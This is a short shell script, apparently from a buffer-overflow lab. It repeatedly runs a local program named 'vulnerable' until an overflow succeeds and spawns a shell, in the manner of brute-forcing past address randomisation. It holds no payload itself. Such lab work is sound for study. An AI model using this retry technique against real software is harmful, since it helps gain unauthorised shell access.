##program to defeat vulnerable_program

i="-1"
echo executing vulnerable program...
while [ $i -lt 0 ]
do
	if ./vulnerable; then
		echo "buffer overflow successed. Shell executed."
		i=$[i+1]
	fi
done

